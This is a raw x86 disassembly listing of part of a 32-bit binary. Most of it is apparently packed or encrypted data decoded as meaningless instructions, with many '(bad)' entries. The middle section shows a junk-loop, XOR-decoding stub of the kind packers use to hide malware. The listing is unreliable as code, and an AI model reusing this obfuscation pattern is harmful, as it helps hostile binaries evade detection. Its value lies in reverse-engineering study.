  40b1c4:	(bad)  
  40b1c5:	enter  0xcc29,0x40
  40b1c9:	adc    eax,0x22328db1
  40b1ce:	mov    bh,0xb5
  40b1d0:	pop    eax
  40b1d1:	inc    edx
  40b1d2:	cld    
  40b1d3:	pandn  mm1,QWORD PTR ds:0x76292a30
  40b1da:	gs mov dh,0x37
  40b1dd:	push   eax
  40b1de:	add    al,BYTE PTR [ecx]
  40b1e0:	add    DWORD PTR [ecx+0x7e],0x51622cb8
  40b1e7:	push   ds
  40b1e8:	in     al,dx
  40b1e9:	mov    bl,0x2a
  40b1eb:	bound  edi,QWORD PTR [edi+0x61]
  40b1ee:	jmp    0x40b234
  40b1f0:	xor    BYTE PTR [edx+0xc356e86],dh
  40b1f6:	inc    eax
  40b1f7:	icebp  
  40b1f8:	xor    bh,ch
  40b1fa:	stc    
  40b1fb:	xor    al,0x5f
  40b1fd:	shr    DWORD PTR [ecx+edx*8],cl
  40b200:	sbb    DWORD PTR [ecx+0x750d14bb],ebp
  40b206:	push   esi
  40b207:	mul    BYTE PTR [eax+0x568bc196]
  40b20d:	cli    
  40b20e:	aaa    
  40b20f:	in     eax,0x82
  40b211:	xor    ebp,DWORD PTR [esi+0x5b]
  40b214:	mov    ch,0xc2
  40b216:	mov    bh,0xe5
  40b218:	xchg   DWORD PTR [ebp+0x5687ccb7],ebx
  40b21e:	into   
  40b21f:	outs   dx,DWORD PTR ds:[esi]
  40b220:	xor    DWORD PTR [esi-0x44],eax
  40b223:	shl    DWORD PTR [ecx+0x42d238c2],cl
  40b229:	jne    0x40b28b
  40b22b:	sbb    BYTE PTR [esi-0x1b],dh
  40b22e:	fnstcw WORD PTR [ebx+0x5b]
  40b231:	sub    al,0x5f
  40b233:	xchg   ebp,eax
  40b234:	dec    ecx
  40b235:	std    
  40b236:	test   dh,al
  40b238:	(bad)  
  40b239:	sbb    DWORD PTR [edx],0xe2a478be
  40b23f:	je     0x40b1cf
  40b241:	call   0x113c:0x55563338
  40b248:	out    dx,eax
  40b249:	push   edx
  40b24a:	xor    esi,DWORD PTR [ebp+0x6d8c1dd]
  40b250:	push   ebp
  40b251:	jge    0x40b235
  40b253:	inc    eax
  40b254:	loopne 0x40b24f
  40b256:	(bad)  
  40b257:	xlat   BYTE PTR ds:[ebx]
  40b258:	outs   dx,DWORD PTR ds:[esi]
  40b259:	jmp    FWORD PTR [edi-0x13]
  40b25c:	mov    dh,0x35
  40b25e:	adc    al,BYTE PTR ds:0x656421d4
  40b264:	stos   DWORD PTR es:[edi],eax
  40b265:	imul   ebx,DWORD PTR [edi],0x47
  40b268:	mov    WORD PTR [ebp+0x1cd199ea],ss
  40b26e:	iret   
  40b26f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b270:	mov    ebp,0x2f639fb4
  40b275:	jmp    0x40b23e
  40b277:	cs push ebx
  40b279:	test   BYTE PTR [edi],dh
  40b27b:	scas   eax,DWORD PTR es:[edi]
  40b27c:	sti    
  40b27d:	(bad)  
  40b27e:	in     eax,dx
  40b27f:	adc    bl,BYTE PTR [ebp-0x60a89b67]
  40b285:	xchg   al,dl
  40b287:	mov    ch,0xc7
  40b289:	bound  esp,QWORD PTR [ebx-0x1]
  40b28c:	ss dec edi
  40b28e:	and    BYTE PTR [edx-0x3327666c],0x3e
  40b295:	xor    DWORD PTR [edi],0xa44d65ef
  40b29b:	out    dx,al
  40b29c:	mov    al,0xa1
  40b29e:	mov    esi,0xbebc6270
  40b2a3:	inc    ebp
  40b2a4:	jmp    0xe16aebda
  40b2a9:	in     eax,dx
  40b2aa:	pop    ecx
  40b2ab:	fcmovnb st,st(4)
  40b2ad:	dec    ebp
  40b2ae:	in     eax,0x2a
  40b2b0:	icebp  
  40b2b1:	iret   
  40b2b2:	(bad)  
  40b2b3:	push   esi
  40b2b4:	add    al,0xb7
  40b2b6:	and    eax,0xa283ac95
  40b2bb:	push   0x9ff705f2
  40b2c0:	(bad)  
  40b2c1:	loopne 0x40b29b
  40b2c3:	js     0x40b2fb
  40b2c5:	push   cs
  40b2c6:	inc    edx
  40b2c7:	xchg   esp,eax
  40b2c8:	outs   dx,BYTE PTR ds:[esi]
  40b2c9:	test   DWORD PTR [eax],ecx
  40b2cb:	das    
  40b2cc:	loope  0x40b310
  40b2ce:	out    dx,al
  40b2cf:	cld    
  40b2d0:	mov    ecx,es
  40b2d2:	shl    DWORD PTR [edi],1
  40b2d4:	mov    al,0x56
  40b2d6:	mov    esi,edx
  40b2d8:	inc    ecx
  40b2d9:	sub    al,BYTE PTR [edi+0x7af1367e]
  40b2df:	jnp    0x40b2b4
  40b2e1:	je     0x40b31b
  40b2e3:	ja     0x40b2b6
  40b2e5:	mov    dh,0xa5
  40b2e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2e8:	or     BYTE PTR [edx],0x2
  40b2eb:	pop    esi
  40b2ec:	cmp    cl,dh
  40b2ee:	inc    eax
  40b2ef:	ror    BYTE PTR [eax+0x5f],0x4b
  40b2f3:	out    0xf0,al
  40b2f5:	test   DWORD PTR [ecx+0x6b],ebp
  40b2f8:	sbb    edx,DWORD PTR [edx]
  40b2fa:	fiadd  WORD PTR [edi+0x2725117f]
  40b300:	shl    DWORD PTR [ebx],1
  40b302:	out    dx,al
  40b303:	outs   dx,DWORD PTR ds:[esi]
  40b304:	mov    ss,WORD PTR [eax+edx*1+0x65]
  40b308:	popf   
  40b309:	ds push es
  40b30b:	sub    eax,0x3e99b956
  40b310:	popf   
  40b311:	clc    
  40b312:	jno    0x40b2c0
  40b314:	add    edx,DWORD PTR [eax+0x621d414b]
  40b31a:	xchg   edx,eax
  40b31b:	pop    ss
  40b31c:	dec    esi
  40b31d:	push   0x89e21463
  40b322:	mov    esp,0xa0123665
  40b327:	scas   eax,DWORD PTR es:[edi]
  40b328:	das    
  40b329:	test   BYTE PTR [edi+ebx*4+0x73450faf],dh
  40b330:	scas   al,BYTE PTR es:[edi]
  40b331:	adc    al,0xef
  40b333:	enter  0xf402,0xd9
  40b337:	pop    ebx
  40b338:	inc    eax
  40b339:	jno    0x40b39a
  40b33b:	into   
  40b33c:	stc    
  40b33d:	test   al,0x43
  40b33f:	in     al,0xb5
  40b341:	fbld   TBYTE PTR [ecx+0x6888e342]
  40b347:	das    
  40b348:	call   0xf7e8:0x72d0060c
  40b34f:	enter  0xad8a,0xbd
  40b353:	test   al,0x8b
  40b355:	mov    edi,DWORD PTR [ebx+0x70]
  40b358:	cmp    BYTE PTR [edi+0x1c],dl
  40b35b:	cmp    bl,BYTE PTR ds:0xaf671510
  40b361:	outs   dx,BYTE PTR ds:[esi]
  40b362:	sub    esp,DWORD PTR [ebx]
  40b364:	dec    ebx
  40b365:	out    0x79,al
  40b367:	ds mov ch,0xf9
  40b36a:	or     esi,DWORD PTR [eax]
  40b36c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b36d:	lods   al,BYTE PTR ds:[esi]
  40b36e:	stos   BYTE PTR es:[edi],al
  40b36f:	in     al,dx
  40b370:	jg     0x40b34a
  40b372:	loopne 0x40b3f2
  40b374:	test   DWORD PTR [ecx-0x3c169f75],eax
  40b37a:	test   DWORD PTR fs:[ebx],0xc8d91c94
  40b381:	in     al,0x23
  40b383:	mov    ecx,DWORD PTR [eax]
  40b385:	dec    esi
  40b386:	je     0x40b39f
  40b388:	add    DWORD PTR [esi-0x7e8005d9],ebp
  40b38e:	pusha  
  40b38f:	dec    ebx
  40b390:	out    dx,al
  40b391:	mov    esp,DWORD PTR [edi]
  40b393:	mov    DWORD PTR [eax+0x3a],ecx
  40b396:	js     0x40b354
  40b398:	sbb    edx,DWORD PTR [ebp-0x6e667b0d]
  40b39e:	loopne 0x40b35f
  40b3a0:	lods   eax,DWORD PTR ds:[esi]
  40b3a1:	in     al,0xa8
  40b3a3:	adc    bh,BYTE PTR [eax-0xf]
  40b3a6:	or     ebx,DWORD PTR [ecx+0x1f594d02]
  40b3ac:	pop    edx
  40b3ad:	sbb    BYTE PTR [ecx+0x1],dh
  40b3b0:	xor    cl,BYTE PTR [edx-0x2d]
  40b3b3:	pop    ebx
  40b3b4:	cmp    DWORD PTR [ebx+ebx*2-0x63],edx
  40b3b8:	add    al,0x8
  40b3ba:	jmp    FWORD PTR [ebx+0x2613a7c4]
  40b3c0:	(bad)  
  40b3c1:	pusha  
  40b3c2:	ss push ebp
  40b3c4:	ret    0x55cb
  40b3c7:	adc    al,0xf3
  40b3c9:	or     ebx,DWORD PTR [esi]
  40b3cb:	push   0x4fada1a
  40b3d0:	jle    0x40b36b
  40b3d2:	xor    BYTE PTR [ecx],bh
  40b3d4:	stos   DWORD PTR es:[edi],eax
  40b3d5:	(bad)  
  40b3d6:	fsubr  st(6),st
  40b3d8:	xor    edx,DWORD PTR ds:0x7a06a9f8
  40b3de:	rcr    BYTE PTR [eax+0x37],cl
  40b3e1:	xor    ecx,DWORD PTR [esi]
  40b3e3:	pop    edx
  40b3e4:	mov    edx,0xe4177645
  40b3e9:	pop    ds
  40b3ea:	xchg   edx,eax
  40b3eb:	adc    DWORD PTR [eax+0x3c934543],edi
  40b3f1:	outs   dx,BYTE PTR ds:[esi]
  40b3f2:	lock inc esi
  40b3f4:	(bad)  
  40b3f5:	jmp    0x88f03772
  40b3fa:	rcl    BYTE PTR [esi-0x48],0x15
  40b3fe:	leave  
  40b3ff:	jae    0x40b3ea
  40b401:	or     esi,DWORD PTR [bx+di]
  40b404:	mov    BYTE PTR [eax],cl
  40b406:	adc    cl,BYTE PTR [ebx-0x4a]
  40b409:	and    ebp,DWORD PTR [eax]
  40b40b:	fdiv   QWORD PTR [eax]
  40b40d:	inc    edi
  40b40e:	dec    ecx
  40b40f:	test   DWORD PTR [edi],0xd3b3d699
  40b415:	je     0x40b474
  40b417:	and    al,0x42
  40b419:	inc    edx
  40b41a:	test   ebp,edx
  40b41c:	es clc 
  40b41e:	lock cmp DWORD PTR ds:0x9da344d6,edi
  40b425:	retf   0xbec6
  40b428:	scas   al,BYTE PTR es:[edi]
  40b429:	add    DWORD PTR [ebp-0x7fe684a7],ebp
  40b42f:	push   es
  40b430:	mov    dl,0x4
  40b432:	sub    eax,0x991c40ad
  40b437:	repnz outs dx,BYTE PTR ds:[esi]
  40b439:	jmp    ebx
  40b43b:	(bad)  
  40b43c:	jnp    0x40b3cb
  40b43e:	addr16 dec edi
  40b440:	(bad)  
  40b441:	js     0x40b482
  40b443:	mov    ah,0x16
  40b445:	cmp    DWORD PTR [eax+0x3a296a23],esi
  40b44b:	sub    edi,DWORD PTR [ecx-0xe]
  40b44e:	loope  0x40b474
  40b450:	jae    0x40b44c
  40b452:	repnz xchg edx,eax
  40b454:	jns    0x40b42c
  40b456:	imul   esp,DWORD PTR [esi],0x8340d0cf
  40b45c:	test   BYTE PTR [eax],ch
  40b45e:	not    BYTE PTR [ebp+0x6]
  40b461:	les    ecx,FWORD PTR [ecx-0x6dce0cf3]
  40b467:	inc    ecx
  40b468:	adc    BYTE PTR [esp+edi*4],dl
  40b46b:	mov    DWORD PTR [esp+edi*4+0x74],edx
  40b46f:	rol    DWORD PTR [ebx-0x4c618cb4],1
  40b475:	out    dx,eax
  40b476:	dec    eax
  40b477:	jmp    0x40b42e
  40b479:	sub    cl,al
  40b47b:	cmp    esi,DWORD PTR [edi-0x57d593ed]
  40b481:	js     0x40b4a4
  40b483:	fld    TBYTE PTR [ebx]
  40b485:	aam    0x46
  40b487:	imul   DWORD PTR [esi+0x6865658a]
  40b48d:	jne    0x40b4e9
  40b48f:	retf   0xebce
  40b492:	(bad)  
  40b493:	stos   BYTE PTR es:[edi],al
  40b494:	mov    ds:0x33facc6b,al
  40b499:	loopne 0x40b467
  40b49b:	ss in  al,0xed
  40b49e:	shl    edx,cl
  40b4a0:	je     0x40b482
  40b4a2:	ja     0x40b4e0
  40b4a4:	xchg   ebp,eax
  40b4a5:	in     al,0xc5
  40b4a7:	inc    edi
  40b4a8:	cmp    ebp,esi
  40b4aa:	dec    esi
  40b4ab:	into   
  40b4ac:	or     eax,0xea0c2521
  40b4b1:	les    ebx,FWORD PTR [eax-0x11]
  40b4b4:	xchg   esi,eax
  40b4b5:	cld    
  40b4b6:	repnz in eax,0xd5
  40b4b9:	daa    
  40b4ba:	pop    edx
  40b4bb:	pop    esp
  40b4bc:	add    DWORD PTR [ebx],ebx
  40b4be:	jle    0x40b533
  40b4c0:	inc    edx
  40b4c1:	and    DWORD PTR [esi],0xe6169657
  40b4c7:	(bad)  
  40b4c9:	xchg   edi,eax
  40b4ca:	xchg   edx,eax
  40b4cb:	loope  0x40b51c
  40b4cd:	int3   
  40b4ce:	jmp    0x40b47a
  40b4d0:	sbb    bl,BYTE PTR [ebp-0x6de193cf]
  40b4d6:	ja     0x40b488
  40b4d8:	outs   dx,DWORD PTR ds:[esi]
  40b4d9:	mov    ds:0xc104cc67,eax
  40b4de:	int3   
  40b4df:	sub    edi,DWORD PTR [ecx+0x6916e931]
  40b4e5:	(bad)  
  40b4e6:	scas   al,BYTE PTR es:[edi]
  40b4e7:	fld    QWORD PTR [esi-0x6111f7e]
  40b4ed:	xor    edx,DWORD PTR [edx]
  40b4ef:	pusha  
  40b4f0:	mov    eax,0xfb208e46
  40b4f5:	stc    
  40b4f6:	or     dh,ah
  40b4f8:	sub    al,0x63
  40b4fa:	mov    ecx,?
  40b4fc:	mov    al,0xf8
  40b4fe:	or     al,0xac
  40b500:	imul   eax,DWORD PTR [esi],0xffffffbc
  40b503:	sub    DWORD PTR [edx+ebx*4],esp
  40b506:	stos   DWORD PTR es:[edi],eax
  40b507:	sbb    dh,bl
  40b509:	sub    eax,0xc4cbc694
  40b50e:	jns    0x40b536
  40b510:	cmc    
  40b511:	stos   DWORD PTR es:[edi],eax
  40b512:	clc    
  40b513:	sub    eax,0xc47e743e
  40b518:	(bad)  
  40b519:	lock inc edi
  40b51b:	sub    BYTE PTR [esi-0x68],bl
  40b51e:	clc    
  40b51f:	jp     0x40b58b
  40b521:	jle    0x40b57c
  40b523:	pop    esp
  40b524:	call   0x7d41:0xd7b5f6d7
  40b52b:	sub    eax,0x57bfe19e
  40b530:	xchg   BYTE PTR [edi-0x8],dh
  40b533:	ins    DWORD PTR es:[edi],dx
  40b534:	fchs   
  40b536:	xor    bl,bh
  40b538:	pop    es
  40b539:	push   esi
  40b53a:	mov    ds:0xd35c6430,al
  40b53f:	pop    edx
  40b540:	adc    al,0xbc
  40b542:	xchg   ecx,eax
  40b543:	jmp    0xe190c2c
  40b548:	sub    al,0x3c
  40b54a:	push   esi
  40b54b:	jecxz  0x40b540
  40b54d:	mov    ebx,0x97f44dfc
  40b552:	xor    eax,0x154b53e3
  40b557:	push   eax
  40b558:	and    ch,al
  40b55a:	sbb    eax,0xfda0336
  40b55f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b560:	in     eax,0x92
  40b562:	repnz mov dh,0xf8
  40b565:	ret    0xe173
  40b568:	jno    0x40b581
  40b56a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b56b:	xchg   DWORD PTR [eax-0x7b232590],ebx
  40b571:	push   ebp
  40b572:	les    edi,FWORD PTR [ebp+0x65]
  40b575:	test   BYTE PTR [ebx-0x2ffec05f],ch
  40b57b:	cmp    edx,DWORD PTR [esi-0x7f]
  40b57e:	(bad)  
  40b57f:	mov    eax,0x57000029
  40b584:	or     edi,DWORD PTR ds:0x42b010
  40b58a:	mov    esi,0x7510893
  40b58f:	or     ecx,ecx
  40b591:	xor    eax,esi
  40b593:	mov    edi,0x3272db
  40b598:	add    eax,edi
  40b59a:	sub    DWORD PTR ds:0x42a018,0x772b
  40b5a4:	mov    DWORD PTR [ebp-0x38],eax
  40b5a7:	mov    eax,ds:0x4217c2
  40b5ac:	mov    ecx,DWORD PTR ds:0x428008
  40b5b2:	and    DWORD PTR ds:0x42b004,ecx
  40b5b8:	mov    eax,DWORD PTR [eax]
  40b5ba:	mov    DWORD PTR ds:0x42a01c,0x19
  40b5c4:	cmp    DWORD PTR ds:0x42a01c,0x0
  40b5cb:	je     0x40b61b
  40b5d1:	cmp    DWORD PTR ds:0x42a01c,0x4
  40b5d8:	jne    0x40b5ef
  40b5de:	push   0x506a
  40b5e3:	push   DWORD PTR [ebp-0x24]
  40b5e6:	push   DWORD PTR [ebp-0x14]
  40b5e9:	call   DWORD PTR ds:0x424028
  40b5ef:	cmp    DWORD PTR ds:0x42a01c,0x5
  40b5f6:	jne    0x40b609
  40b5fc:	mov    ecx,DWORD PTR ds:0x42a01c
  40b602:	dec    ecx
  40b603:	mov    DWORD PTR ds:0x42a01c,ecx
  40b609:	mov    ecx,DWORD PTR ds:0x42a01c
  40b60f:	dec    ecx
  40b610:	mov    DWORD PTR ds:0x42a01c,ecx
  40b616:	jmp    0x40b5c4
  40b61b:	mov    DWORD PTR [ebp-0x24],eax
  40b61e:	add    DWORD PTR ds:0x428014,ecx
  40b624:	mov    eax,ds:0x4219ca
  40b629:	mov    ecx,DWORD PTR ds:0x42173a
  40b62f:	mov    ecx,DWORD PTR [ecx]
  40b631:	adc    DWORD PTR ds:0x42a008,ecx
  40b637:	mov    eax,DWORD PTR [eax]
  40b639:	and    DWORD PTR ds:0x42a01c,0x0
  40b643:	jmp    0x40b655
  40b648:	mov    ecx,DWORD PTR ds:0x42a01c
  40b64e:	inc    ecx
  40b64f:	mov    DWORD PTR ds:0x42a01c,ecx
  40b655:	cmp    DWORD PTR ds:0x42a01c,0x10
  40b65c:	jae    0x40b75b
  40b662:	cmp    DWORD PTR ds:0x42a01c,0x8
  40b669:	jne    0x40b67f
  40b66f:	push   0x42357e
  40b674:	push   0x4234fe
  40b679:	call   DWORD PTR ds:0x424030
  40b67f:	cmp    DWORD PTR ds:0x42a01c,0x7
  40b686:	jne    0x40b69b
  40b68c:	xor    ecx,ecx
  40b68e:	xor    ecx,DWORD PTR ds:0x42a01c
  40b694:	inc    ecx
  40b695:	mov    DWORD PTR ds:0x42a01c,ecx
  40b69b:	jmp    0x40b648
  40b6a0:	and    DWORD PTR ds:0x42901c,0x0
  40b6aa:	jmp    0x40b6bc
  40b6af:	mov    ecx,DWORD PTR ds:0x42901c
  40b6b5:	inc    ecx
  40b6b6:	mov    DWORD PTR ds:0x42901c,ecx
  40b6bc:	cmp    DWORD PTR ds:0x42901c,0x11
  40b6c3:	jae    0x40b75b
  40b6c9:	cmp    DWORD PTR ds:0x42901c,0x7
  40b6d0:	jne    0x40b6f6
  40b6d6:	push   DWORD PTR [ebp-0x10]
  40b6d9:	push   DWORD PTR [ebp-0x18]
  40b6dc:	push   0x2cae
  40b6e1:	push   0x19d0
  40b6e6:	push   0x7b35
  40b6eb:	push   0x42c01c
  40b6f0:	call   DWORD PTR ds:0x424038
  40b6f6:	cmp    DWORD PTR ds:0x42901c,0x6
  40b6fd:	jne    0x40b710
  40b703:	mov    ecx,DWORD PTR ds:0x42901c
  40b709:	inc    ecx
  40b70a:	mov    DWORD PTR ds:0x42901c,ecx
  40b710:	jmp    0x40b6af
  40b715:	mov    DWORD PTR ds:0x42c00c,0x11
  40b71f:	cmp    DWORD PTR ds:0x42c00c,0x0
  40b726:	je     0x40b75b
  40b72c:	cmp    DWORD PTR ds:0x42c00c,0x18
  40b733:	jne    0x40b749
  40b739:	push   0x42a008
  40b73e:	push   0x6229
  40b743:	call   DWORD PTR ds:0x42403c
  40b749:	mov    ecx,DWORD PTR ds:0x42c00c
  40b74f:	dec    ecx
  40b750:	mov    DWORD PTR ds:0x42c00c,ecx
  40b756:	jmp    0x40b71f
  40b75b:	mov    DWORD PTR [ebp-0x28],eax
  40b75e:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  40b765:	mov    eax,DWORD PTR [ebp-0x34]
  40b768:	xor    eax,esi
  40b76a:	add    eax,edi
  40b76c:	sbb    DWORD PTR ds:0x42a000,0x3656
  40b776:	mov    DWORD PTR [ebp-0x38],eax
  40b779:	mov    eax,ds:0x421942
  40b77e:	mov    DWORD PTR [ebp-0x38],eax
  40b781:	or     eax,0x6382
  40b786:	mov    eax,DWORD PTR [ebp-0x24]
  40b789:	and    DWORD PTR ds:0x42a008,0x0
  40b793:	mov    ecx,DWORD PTR ds:0x42a008
  40b799:	inc    ecx
  40b79a:	mov    DWORD PTR ds:0x42a008,ecx
  40b7a0:	cmp    DWORD PTR ds:0x42a008,0x9
  40b7a7:	jne    0x40b7bb
  40b7ad:	push   DWORD PTR [ebp-0x14]
  40b7b0:	push   0x4234d9
  40b7b5:	call   DWORD PTR ds:0x424040
  40b7bb:	cmp    DWORD PTR ds:0x42a008,0x8
  40b7c2:	jne    0x40b7d7
  40b7c8:	xor    ecx,ecx
  40b7ca:	add    ecx,DWORD PTR ds:0x42a008
  40b7d0:	inc    ecx
  40b7d1:	mov    DWORD PTR ds:0x42a008,ecx
  40b7d7:	cmp    DWORD PTR ds:0x42a008,0x17
  40b7de:	jb     0x40b793
  40b7e4:	mov    DWORD PTR [ebp-0x14],eax
  40b7e7:	mov    eax,DWORD PTR [ebp-0x14]
  40b7ea:	dec    DWORD PTR ds:0x42c000
  40b7f0:	push   0x4
  40b7f2:	and    ecx,DWORD PTR ds:0x42a018
  40b7f8:	pop    ecx
  40b7f9:	sbb    DWORD PTR ds:0x42b000,0x429004
  40b803:	sub    ecx,eax
  40b805:	xor    DWORD PTR ds:0x42a01c,0x102e
  40b80f:	add    ecx,DWORD PTR [ebp-0x28]
  40b812:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  40b819:	adc    eax,0x5aaa
  40b81e:	mov    DWORD PTR [ebp-0x20],ecx
  40b821:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  40b82b:	and    DWORD PTR ds:0x428010,0x0
  40b835:	jmp    0x40b848
  40b83a:	xor    eax,eax
  40b83c:	add    eax,DWORD PTR ds:0x428010
  40b842:	inc    eax
  40b843:	mov    ds:0x428010,eax
  40b848:	cmp    DWORD PTR ds:0x428010,0x10
  40b84f:	jae    0x40b88a
  40b855:	cmp    DWORD PTR ds:0x428010,0x9
  40b85c:	jne    0x40b86d
  40b862:	push   0x4234f0
  40b867:	call   DWORD PTR ds:0x424044
  40b86d:	cmp    DWORD PTR ds:0x428010,0x8
  40b874:	jne    0x40b885
  40b87a:	mov    eax,ds:0x428010
  40b87f:	inc    eax
  40b880:	mov    ds:0x428010,eax
  40b885:	jmp    0x40b83a
  40b88a:	mov    eax,DWORD PTR [ebp-0x14]
  40b88d:	sbb    DWORD PTR ds:0x42a018,0x429014
  40b897:	mov    DWORD PTR [ebp-0x90],eax
  40b89d:	dec    eax
  40b89e:	mov    eax,DWORD PTR [ebp-0x20]
  40b8a1:	mov    DWORD PTR [ebp-0x8c],eax
  40b8a7:	add    DWORD PTR ds:0x42c00c,0x20f
  40b8b1:	mov    eax,DWORD PTR [ebp-0x2c]
  40b8b4:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  40b8be:	xor    eax,esi
  40b8c0:	add    eax,edi
  40b8c2:	mov    DWORD PTR [ebp-0x88],eax
  40b8c8:	lea    eax,[ebp-0x50]
  40b8cb:	or     DWORD PTR ds:0x42b014,0x1a32
  40b8d5:	mov    DWORD PTR [ebp-0x84],eax
  40b8db:	mov    eax,DWORD PTR [ebp-0x94]
  40b8e1:	xor    DWORD PTR ds:0x42b010,0x42a00c
  40b8eb:	xor    eax,esi
  40b8ed:	xor    DWORD PTR ds:0x42900c,0x429018
  40b8f7:	add    eax,edi
  40b8f9:	and    DWORD PTR ds:0x428020,0x42c01c
  40b903:	mov    DWORD PTR [ebp-0x94],eax
  40b909:	and    DWORD PTR ds:0x42a000,0x429010
  40b913:	lea    eax,[ebp-0x94]
  40b919:	adc    DWORD PTR ds:0x42b018,0x42c018
  40b923:	push   eax
  40b924:	movzx  eax,WORD PTR ds:0x42b01c
  40b92b:	add    DWORD PTR ds:0x42a008,eax
  40b931:	mov    eax,DWORD PTR [ebp+0xc]
  40b934:	xor    eax,esi
  40b936:	add    DWORD PTR ds:0x428028,0x2102
  40b940:	add    eax,edi
  40b942:	sub    DWORD PTR ds:0x429010,0x36a
  40b94c:	push   eax
  40b94d:	mov    eax,ds:0x421962
  40b952:	adc    DWORD PTR ds:0x428024,0x6674
  40b95c:	push   0x4218b8
  40b961:	and    DWORD PTR ds:0x42a014,0x6ed
  40b96b:	push   DWORD PTR [eax]
  40b96d:	add    DWORD PTR ds:0x42a000,0x42900c
  40b977:	call   0x405c6f
  40b97c:	or     eax,DWORD PTR ds:0x42901c
  40b982:	mov    eax,DWORD PTR [ebp-0x14]
  40b985:	and    ecx,0x4079
  40b98b:	mov    ecx,DWORD PTR [ebp-0x20]
  40b98e:	sub    DWORD PTR ds:0x42b01c,0xab5
  40b998:	mov    DWORD PTR [ebp-0x44],ecx
  40b99b:	sbb    DWORD PTR ds:0x42b01c,edi
  40b9a1:	mov    ecx,DWORD PTR [ebp+0x8]
  40b9a4:	jmp    0x40dd19
  40b9a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9aa:	or     ah,bl
  40b9ac:	imul   ebx,DWORD PTR [ebp+eiz*2+0x7fef0363],0xaba06403
  40b9b7:	sbb    eax,0x62f44f0f
  40b9bc:	bound  ecx,QWORD PTR [edx]
  40b9be:	pop    edi
  40b9bf:	bound  esp,QWORD PTR [edx+0x6d]
  40b9c2:	ins    DWORD PTR es:[edi],dx
  40b9c3:	jmp    0x40b9a0
  40b9c5:	mov    ah,0x75
  40b9c7:	lahf   
  40b9c8:	adc    al,0xb4
  40b9ca:	push   edi
  40b9cb:	out    dx,al
  40b9cc:	sbb    eax,0x83bf7a2d
  40b9d1:	add    al,0xb
  40b9d3:	dec    esi
  40b9d4:	pop    eax
  40b9d5:	jp     0x40b9e6
  40b9d7:	mov    ebp,0x72fdf94c
  40b9dc:	into   
  40b9dd:	push   0x43
  40b9df:	adc    eax,0x62d2fd67
  40b9e4:	rcr    BYTE PTR [eax+0x1a],0xf9
  40b9e8:	faddp  st(2),st
  40b9ea:	xchg   ebp,eax
  40b9eb:	mov    WORD PTR [esi],cs
  40b9ed:	cmp    edx,esp
  40b9ef:	imul   ebx,edi,0x6d673598
  40b9f5:	xor    DWORD PTR [esi],ebx
  40b9f7:	(bad)
  40b9fb:	push   esi
  40b9fc:	(bad)  
  40b9fd:	mov    ebp,0xcc4722b7
  40ba02:	push   esp
  40ba03:	scas   eax,DWORD PTR es:[edi]
  40ba04:	cmp    BYTE PTR [eax-0x6ebef03b],0x60
  40ba0b:	sti    
  40ba0c:	jle    0x40ba40
  40ba0e:	cmp    cl,BYTE PTR [ebx+0x18794744]
  40ba14:	test   eax,0x66938b71
  40ba19:	(bad)  
  40ba1a:	and    al,BYTE PTR [edi]
  40ba1c:	jp     0x40b9e0
  40ba1e:	ss pop esp
  40ba20:	xchg   ebp,eax
  40ba21:	fbstp  TBYTE PTR [ebp-0x19f5174a]
  40ba27:	adc    BYTE PTR ds:0x7c83375c,ch
  40ba2d:	test   bh,ch
  40ba2f:	xchg   ebp,eax
  40ba30:	inc    ebx
  40ba31:	loope  0x40ba35
  40ba33:	push   0xffffff99
  40ba35:	pop    ebp
  40ba36:	fwait
  40ba37:	and    ch,cl
  40ba39:	jo     0x40b9e5
  40ba3b:	cli    
  40ba3c:	imul   eax,eax,0x77e15697
  40ba42:	sbb    eax,0x95f882ba
  40ba47:	mov    ch,0x76
  40ba49:	jecxz  0x40b9d6
  40ba4b:	and    eax,0xa2b92a8e
  40ba50:	or     BYTE PTR [edx+0x4901e085],bh
  40ba56:	mov    dh,0xf4
  40ba58:	bound  esi,QWORD PTR [eax]
  40ba5a:	addr16 jmp 0x40ba06
  40ba5d:	push   ss
  40ba5e:	daa    
  40ba5f:	and    edi,esp
  40ba61:	push   ebx
  40ba62:	xor    DWORD PTR [edx+0x377854c],ebp
  40ba68:	dec    eax
  40ba69:	sub    eax,0xf8f052b4
  40ba6e:	jle    0x40b9fa
  40ba70:	fsub   QWORD PTR [edx+ecx*4-0x23]
  40ba74:	(bad)  
  40ba75:	out    dx,eax
  40ba76:	jle    0x40ba6e
  40ba78:	out    0x9d,eax
  40ba7a:	lods   eax,DWORD PTR ds:[esi]
  40ba7b:	sbb    BYTE PTR [ebx+0x67],bl
  40ba7e:	mov    esi,DWORD PTR [eax+ecx*4+0x3a]
  40ba82:	cmp    dh,BYTE PTR [ecx+eiz*1+0x70]
  40ba86:	mov    ds:0x34a97616,eax
  40ba8b:	pop    esi
  40ba8c:	lahf   
  40ba8d:	ja     0x40bae0
  40ba8f:	adc    ecx,ecx
  40ba91:	fld    st(1)
  40ba93:	jle    0x40bad9
  40ba95:	pop    ecx
  40ba96:	jmp    0x40bb07
  40ba98:	rol    DWORD PTR [ebx+eax*4-0x1c971506],1
  40ba9f:	mov    BYTE PTR [esi+edi*1-0x16],dl
  40baa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baa4:	pop    eax
  40baa5:	jp     0x40ba68
  40baa7:	push   esi
  40baa8:	xchg   ebx,eax
  40baa9:	popa   
  40baaa:	xchg   edi,eax
  40baab:	mov    eax,0xeb9f43c4
  40bab0:	js     0x40ba3b
  40bab2:	mov    ds:0x8da9018,eax
  40bab7:	or     ecx,esp
  40bab9:	jo     0x40bafe
  40babb:	gs lock push esp
  40babe:	xor    eax,0xd5ecd2e8
  40bac3:	test   ah,0xe9
  40bac6:	dec    edx
  40bac7:	iret   
  40bac8:	addr16 mov ecx,0xe4b1b5e7
  40bace:	push   ds
  40bacf:	mov    esp,0x2a06737f
  40bad4:	push   esi
  40bad5:	mov    dh,0x6c
  40bad7:	ds out dx,al
  40bad9:	jecxz  0x40bb51
  40badb:	sbb    al,0x3d
